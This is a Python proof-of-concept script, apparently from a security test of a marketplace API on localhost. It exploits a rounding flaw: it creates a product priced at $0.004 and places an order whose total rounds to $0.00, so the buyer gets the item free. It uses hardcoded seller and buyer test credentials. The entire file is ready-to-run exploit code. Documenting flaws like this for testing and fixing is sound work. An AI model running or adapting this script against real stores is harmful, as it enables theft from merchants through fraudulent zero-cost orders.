#!/usr/bin/env python3
"""
BL-4 — Float Precision: Zero-Total Order for Free Items
Endpoint: POST /api/products (seller) + POST /api/orders (buyer)
Auth    : Seller to create product, buyer to order

Product price validation was changed from gt=0 to ge=0, allowing
prices as small as $0.001. When price * quantity rounds to $0.00,
the order total becomes zero. The wallet balance check always passes
(any balance >= $0.00) and no funds are deducted — item acquired free.

Trigger: price=0.004, quantity=1  →  round(0.004, 2) = 0.0  →  free

Usage
-----
    python poc_013_float_precision_zero_total.py
"""

import argparse
import sys
import requests

SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"
BUYER_EMAIL     = "charlie@mercury.com"
BUYER_PASSWORD  = "Buyer123!"

EXPLOIT_PRICE   = 0.004   # rounds to $0.00


def banner():
    print("=" * 60)
    print("  BL-4 — Float Precision: Free Item via $0 Order Total")
    print("  Endpoints: POST /api/products + POST /api/orders")
    print("=" * 60)


def login(base_url, email, password, label):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print(f"[-] Login failed for {label}"); sys.exit(1)
    print(f"[+] Authenticated as {label}")
    return token


def create_product(base_url, token, price):
    resp = requests.post(f"{base_url}/api/products",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"title": "Precision Test Item",
                               "description": "Testing float precision edge case",
                               "price": price,
                               "quantity": 100,
                               "category": "Other"}, timeout=10)
    resp.raise_for_status()
    data = resp.json()
    print(f"[+] Product created: id={data['id']} price=${data['price']}")
    return data["id"]


def get_balance(base_url, token):
    resp = requests.get(f"{base_url}/api/wallet",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()["balance"]


def deposit(base_url, token, amount):
    requests.post(f"{base_url}/api/wallet/deposit",
                  headers={"Authorization": f"Bearer {token}"},
                  json={"amount": amount, "payment_method": "card"}, timeout=10)


def place_order(base_url, token, product_id):
    resp = requests.post(f"{base_url}/api/orders",
                         headers={"Authorization": f"Bearer {token}"},
                         json={"items": [{"product_id": product_id, "quantity": 1}],
                               "shipping_address": "free"}, timeout=10)
    return resp


def cleanup_product(base_url, token, product_id):
    requests.delete(f"{base_url}/api/products/{product_id}",
                    headers={"Authorization": f"Bearer {token}"}, timeout=10)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--price", type=float, default=EXPLOIT_PRICE,
                        help=f"Product price (default: {EXPLOIT_PRICE} → rounds to $0.00)")
    args = parser.parse_args()

    banner()
    print(f"[*] Price: ${args.price}  →  round({args.price} * 1, 2) = ${round(args.price, 2):.2f}")
    print()

    seller_token = login(args.url, SELLER_EMAIL, SELLER_PASSWORD, "Seller (alice)")
    buyer_token  = login(args.url, BUYER_EMAIL,  BUYER_PASSWORD,  "Buyer  (charlie)")
    print()

    product_id = create_product(args.url, seller_token, args.price)

    deposit(args.url, buyer_token, 10)
    balance_before = get_balance(args.url, buyer_token)
    print(f"[*] Buyer balance before: ${balance_before:.2f}")
    print(f"[*] Placing order for product at ${args.price} ...")

    resp = place_order(args.url, buyer_token, product_id)
    if resp.status_code in (200, 201):
        data = resp.json()
        balance_after = get_balance(args.url, buyer_token)
        print(f"[+] Order placed! total_amount=${data['total_amount']:.4f}")
        print(f"[+] Buyer balance after: ${balance_after:.2f}  (deducted: ${balance_before - balance_after:.4f})")
        if data["total_amount"] == 0.0:
            print(f"[+] CONFIRMED — order total is $0.00, item acquired for free!")
    else:
        print(f"[-] {resp.status_code}: {resp.json().get('detail')}")

    cleanup_product(args.url, seller_token, product_id)
    print("\n[+] Done.")


if __name__ == "__main__":
    main()
